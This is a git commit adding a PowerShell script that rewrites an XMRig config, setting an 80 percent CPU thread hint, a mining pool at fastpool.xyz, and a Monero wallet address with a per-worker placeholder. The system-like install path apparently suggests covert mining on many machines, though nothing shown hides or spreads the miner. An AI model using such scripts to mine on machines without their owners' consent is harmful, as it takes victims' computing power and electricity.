d20246619346880567db71fb12683209d1bc7bd4
Wilson-wags-his-tail <144163183+Wilson-wags-his-tail@users.noreply.github.com>
2023-09-07 10:40:25 -0300

    Add files via upload

---
+++ wilson/modify_json.ps1
@@ -0,0 +1,15 @@
+# Load the JSON data from the file
+$jsonData = Get-Content -Raw -Path "C:\Win64\programs\wilson\config.json" | ConvertFrom-Json
+
+# Modify the values
+$jsonData.cpu.'max-threads-hint' = "80"
+$jsonData.pools[0].url = "fastpool.xyz:10055"
+$jsonData.pools[0].user = "47B1qAHmTVeN9bb4j13RvJeDeedsVpfqsi8SYGZL5Uzt2rvTTXMU1ddhntLAnNnvWNjUH2zqCjqfGYkUjzBdNe73G6X29nq@%WORKER_NAME%"
+
+# Convert the modified data back to JSON
+$modifiedJson = $jsonData | ConvertTo-Json -Depth 10
+
+# Save the modified JSON data back to the file
+$modifiedJson | Set-Content -Path "C:\win64\programs\xmrig-6.20.0\config.json"
+
+Write-Host "JSON data modified successfully!"
